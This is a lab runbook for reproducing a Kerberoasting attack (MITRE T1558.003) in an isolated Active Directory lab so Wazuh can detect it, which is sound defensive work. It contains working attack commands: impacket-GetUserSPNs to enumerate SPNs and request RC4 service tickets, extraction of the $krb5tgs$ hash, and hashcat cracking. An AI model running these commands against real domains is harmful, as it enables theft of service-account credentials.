# Kerberoasting Scenario Execution

This document describes the controlled execution of a Kerberoasting scenario in the Active Directory laboratory.

The scenario is designed to generate observable Kerberos telemetry for defensive analysis with Wazuh.

> [!WARNING]
> Run these commands only in an isolated and explicitly authorized laboratory.
> Credentials, Kerberos tickets and password hashes must never be committed to the public repository.

---

## 1. Scenario Objective

The objective is to reproduce behavior compatible with:

```text
MITRE ATT&CK T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting
```

The scenario demonstrates that an authenticated domain user can:

1. enumerate accounts associated with Service Principal Names;
2. request a Kerberos service ticket;
3. export the encrypted ticket material;
4. test password candidates offline;
5. generate Windows and Wazuh evidence suitable for detection engineering.

The scenario does not require compromise of the Key Distribution Center and does not exploit a vulnerability in the Kerberos protocol.

It abuses normal Kerberos functionality together with a weak password and a service account configured to support RC4.

---

## 2. Laboratory Context

| Component | Role |
|---|---|
| `DC01` | Domain Controller and Kerberos Key Distribution Center |
| `WS01` | Domain-joined Windows workstation |
| `Wazuh-Manager` | Central SIEM and detection platform |
| `Kali-ATK01` | Controlled attack simulation host |
| `<SERVICE_ACCOUNT>` | Non-privileged laboratory service account |
| `<SERVICE_SPN>` | Controlled Service Principal Name |
| `lab.local` | Active Directory domain |

The public repository deliberately omits:

- passwords;
- complete Kerberos tickets;
- password hashes;
- Wazuh SSH credentials;
- private key material;
- agent registration keys.

---

## 3. Attack Preconditions

The scenario requires:

1. a valid domain account;
2. network access to the Domain Controller;
3. a user account with a registered SPN;
4. Kerberos service-ticket auditing enabled on the Domain Controller;
5. Windows Security events collected by the Wazuh agent;
6. a deliberately weak laboratory password;
7. temporary RC4 support for the controlled service account.

The service account must not belong to privileged groups.

The objective is to demonstrate credential exposure without granting unnecessary administrative privileges.

---

## 4. Prepare the Controlled Service Account

Run the following commands from an administrative PowerShell session on `DC01`.

Replace the placeholders locally before execution.

Do not commit the resulting password to GitHub.

```powershell
Import-Module ActiveDirectory

$ServiceAccount = '<SERVICE_ACCOUNT>'
$ServicePassword = ConvertTo-SecureString '<LAB_SERVICE_PASSWORD>' -AsPlainText -Force

$ExistingAccount = Get-ADUser `
    -Filter "SamAccountName -eq '$ServiceAccount'" `
    -ErrorAction SilentlyContinue

if ($null -eq $ExistingAccount) {
    New-ADUser `
        -Name $ServiceAccount `
        -SamAccountName $ServiceAccount `
        -UserPrincipalName "$ServiceAccount@lab.local" `
        -AccountPassword $ServicePassword `
        -Enabled $true `
        -PasswordNeverExpires $true `
        -Description 'Controlled Kerberoasting service account'
}

Set-ADAccountPassword `
    -Identity $ServiceAccount `
    -Reset `
    -NewPassword $ServicePassword

Enable-ADAccount -Identity $ServiceAccount

Set-ADUser `
    -Identity $ServiceAccount `
    -PasswordNeverExpires $true `
    -Description 'Controlled Kerberoasting service account'
```

Verify the account:

```powershell
Get-ADUser $ServiceAccount `
    -Properties Enabled,PasswordNeverExpires,Description |
Format-List `
    SamAccountName,
    Enabled,
    PasswordNeverExpires,
    Description
```

---

## 5. Verify Minimum Privilege

Check the account memberships:

```powershell
Get-ADPrincipalGroupMembership '<SERVICE_ACCOUNT>' |
    Select-Object Name,GroupScope,GroupCategory |
    Format-Table -AutoSize
```

The account must not belong to:

```text
Domain Admins
Enterprise Admins
Administrators
Schema Admins
Account Operators
Server Operators
Backup Operators
```

A normal membership such as `Domain Users` is sufficient for the scenario.

---

## 6. Register the Controlled SPN

Define and register a laboratory SPN:

```powershell
$ServiceAccount = '<SERVICE_ACCOUNT>'
$ServiceSpn = '<SERVICE_SPN>'

setspn.exe -Q $ServiceSpn
setspn.exe -S $ServiceSpn "LAB\$ServiceAccount"
setspn.exe -L "LAB\$ServiceAccount"
```

Example SPN structure:

```text
MSSQLSvc/DC01.lab.local:1433
```

The service represented by the SPN does not need to be operational for the KDC to issue a service ticket.

The SPN must be unique in Active Directory.

---

## 7. Temporarily Enable RC4 for the Demonstration

The vulnerable configuration is enabled only for the controlled laboratory account:

```powershell
Set-ADUser `
    -Identity '<SERVICE_ACCOUNT>' `
    -Replace @{'msDS-SupportedEncryptionTypes'=4}
```

Verify it:

```powershell
Get-ADUser '<SERVICE_ACCOUNT>' `
    -Properties ServicePrincipalName,msDS-SupportedEncryptionTypes,PasswordNeverExpires |
Format-List `
    SamAccountName,
    ServicePrincipalName,
    msDS-SupportedEncryptionTypes,
    PasswordNeverExpires
```

Expected laboratory value:

```text
msDS-SupportedEncryptionTypes : 4
```

The value `4` represents RC4-HMAC support.

This configuration is deliberately insecure and must not be treated as a production recommendation.

---

## 8. Enable Kerberos Service-Ticket Auditing

Run on `DC01`:

```powershell
auditpol.exe `
    /set `
    /subcategory:"Kerberos Service Ticket Operations" `
    /success:enable `
    /failure:enable
```

Verify the policy:

```powershell
auditpol.exe `
    /get `
    /subcategory:"Kerberos Service Ticket Operations"
```

The expected result is:

```text
Kerberos Service Ticket Operations    Success and Failure
```

The principal event used by this scenario is:

```text
Windows Security Event ID 4769
```

The event is generated on the Domain Controller because the KDC processes the TGS request.

---

## 9. Verify Wazuh Collection

On `DC01`, verify that the Wazuh agent is running:

```powershell
Get-Service WazuhSvc |
    Format-Table Name,Status,StartType
```

Verify that the Windows Security channel is collected:

```powershell
Select-String `
    -Path 'C:\Program Files (x86)\ossec-agent\ossec.conf' `
    -Pattern 'Security|eventchannel' `
    -Context 2,2
```

The configuration must contain an entry equivalent to:

```xml
<localfile>
  <location>Security</location>
  <log_format>eventchannel</log_format>
</localfile>
```

---

## 10. Enumerate Accounts with SPNs

From `Kali-ATK01`, use an authorized domain account:

```bash
impacket-GetUserSPNs \
  -dc-ip <DC_IP> \
  'lab.local/<DOMAIN_USER>:<DOMAIN_USER_PASSWORD>'
```

This performs an authenticated LDAP query for domain users associated with SPNs.

Expected laboratory result:

```text
ServicePrincipalName             Name
<SERVICE_SPN>                    <SERVICE_ACCOUNT>
```

Enumeration alone is not proof of malicious activity.

It should be interpreted together with subsequent ticket requests, the requesting identity, the source system and the number of services queried.

---

## 11. Request a Kerberos Service Ticket

Request a ticket only for the controlled service account:

```bash
impacket-GetUserSPNs \
  -dc-ip <DC_IP> \
  -request-user <SERVICE_ACCOUNT> \
  'lab.local/<DOMAIN_USER>:<DOMAIN_USER_PASSWORD>' \
  | tee kerberoasting-output.txt
```

The output may contain material beginning with:

```text
$krb5tgs$23$*
```

Do not commit the complete line.

For public documentation, replace it with:

```text
<REDACTED_KERBEROS_TICKET>
```

The value `23` is the decimal Kerberos encryption type for RC4-HMAC.

The same encryption type appears in Windows Event ID 4769 as:

```text
0x17
```

---

## 12. Extract the Ticket Locally

The following local command can isolate the Hashcat-compatible line:

```bash
grep '^\$krb5tgs\$' \
  kerberoasting-output.txt \
  > kerberoasting-ticket-private.txt
```

Verify that one ticket was exported:

```bash
wc -l kerberoasting-ticket-private.txt
```

The ticket file is private laboratory material and must not be added to Git.

---

## 13. Generate the Correlation Sequence

The project correlates three suspicious RC4 ticket requests from the same source in 120 seconds.

Run:

```bash
for i in 1 2 3; do
  echo "Controlled TGS request $i of 3"

  impacket-GetUserSPNs \
    -dc-ip <DC_IP> \
    -request-user <SERVICE_ACCOUNT> \
    'lab.local/<DOMAIN_USER>:<DOMAIN_USER_PASSWORD>' \
    >/dev/null

  sleep 2
done
```

Expected Wazuh behavior:

```text
First request  → rule 100040
Second request → rule 100040
Third request  → rule 100041
```

Rule `100041` is the correlated alert.

Depending on Wazuh rule processing, the third event may display the higher-level correlated rule instead of another visible `100040` alert.

---

## 14. Controlled Offline Password Test

Kerberoasting password testing happens offline.

A private laboratory dictionary can be created locally:

```bash
printf '%s\n' \
  '<CANDIDATE_PASSWORD_1>' \
  '<LAB_SERVICE_PASSWORD>' \
  '<CANDIDATE_PASSWORD_2>' \
  > private-lab-wordlist.txt
```

Run Hashcat:

```bash
hashcat \
  -m 13100 \
  -a 0 \
  kerberoasting-ticket-private.txt \
  private-lab-wordlist.txt \
  --potfile-path private-kerberoasting.pot
```

Show the local result:

```bash
hashcat \
  -m 13100 \
  kerberoasting-ticket-private.txt \
  --show \
  --potfile-path private-kerberoasting.pot
```

Do not commit:

```text
kerberoasting-output.txt
kerberoasting-ticket-private.txt
private-lab-wordlist.txt
private-kerberoasting.pot
```

The public repository should only state whether the controlled test succeeded.

---

## 15. Why Wazuh Does Not Observe the Password Attempts

After the ticket has been obtained, password candidates are tested locally on `Kali-ATK01`.

Hashcat does not contact the Domain Controller for every candidate.

Consequently:

- the domain does not receive one authentication attempt per password;
- the service account is not locked by the offline test;
- Windows does not generate thousands of failed-logon events;
- Wazuh observes the ticket request, not the local cracking loop.

This is why detection must focus on the activity that precedes offline password testing.

---

## 16. Verify the Windows Event

Run on `DC01`:

```powershell
Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'
    Id        = 4769
    StartTime = (Get-Date).AddMinutes(-30)
} |
Where-Object {
    $_.Message -match '<SERVICE_ACCOUNT>|<ATTACKER_IP>'
} |
Select-Object TimeCreated,RecordId,Message |
Format-List
```

Relevant fields include:

| Field | Expected laboratory meaning |
|---|---|
| Event ID | `4769` |
| Service Name | Controlled service account or SPN |
| Client Address | Controlled attacker address |
| Ticket Encryption Type | `0x17` |
| Status | Successful ticket request |
| Ticket Options | Kerberos request options |

IPv4 addresses may appear in IPv4-mapped IPv6 format:

```text
::ffff:<ATTACKER_IP>
```

---

## 17. Verify the Wazuh Alerts

Use the scenario filter:

```text
scenarios/kerberoasting/wazuh-filter.kql
```

The expected alert chain is:

```text
4769 with RC4 from unusual source
            ↓
         100040
            ↓
three matches from the same source in 120 seconds
            ↓
         100041
```

A complementary Sysmon detection may generate:

```text
100042
```

This supporting rule requires Windows Sysmon network telemetry and is not expected when the ticket request is executed directly from Linux.

---

## 18. Restore a Safer Configuration

After collecting the evidence, replace RC4 with AES support and rotate the service password.

Run on `DC01`:

```powershell
Import-Module ActiveDirectory

$NewServicePassword = ConvertTo-SecureString `
    '<STRONG_RANDOM_SERVICE_PASSWORD>' `
    -AsPlainText `
    -Force

Set-ADUser `
    -Identity '<SERVICE_ACCOUNT>' `
    -Replace @{'msDS-SupportedEncryptionTypes'=24}

Set-ADAccountPassword `
    -Identity '<SERVICE_ACCOUNT>' `
    -Reset `
    -NewPassword $NewServicePassword

Set-ADUser `
    -Identity '<SERVICE_ACCOUNT>' `
    -PasswordNeverExpires $false
```

The value `24` enables:

```text
AES128
AES256
```

Verify the final state:

```powershell
Get-ADUser '<SERVICE_ACCOUNT>' `
    -Properties ServicePrincipalName,msDS-SupportedEncryptionTypes,PasswordNeverExpires,PasswordLastSet |
Format-List `
    SamAccountName,
    PasswordNeverExpires,
    PasswordLastSet,
    ServicePrincipalName,
    msDS-SupportedEncryptionTypes
```

---

## 19. Optional Cleanup

Remove the controlled SPN:

```powershell
setspn.exe `
    -D '<SERVICE_SPN>' `
    'LAB\<SERVICE_ACCOUNT>'
```

Disable the controlled account:

```powershell
Disable-ADAccount -Identity '<SERVICE_ACCOUNT>'
```

Do not remove the account until all evidence has been exported and anonymized.

---

## 20. Expected Detection Result

The validated laboratory sequence is:

```text
Authenticated domain account
        ↓
LDAP enumeration of SPNs
        ↓
TGS request for controlled service account
        ↓
Windows Security Event ID 4769
        ↓
RC4-HMAC identified as 0x17
        ↓
Request from controlled attacker source
        ↓
Wazuh rule 100040
        ↓
Three requests from the same source in 120 seconds
        ↓
Wazuh rule 100041
        ↓
Offline password test outside Wazuh visibility
```

The evidence supports behavior compatible with Kerberoasting.

No isolated event proves that the password was cracked or that the ticket was requested with malicious intent.
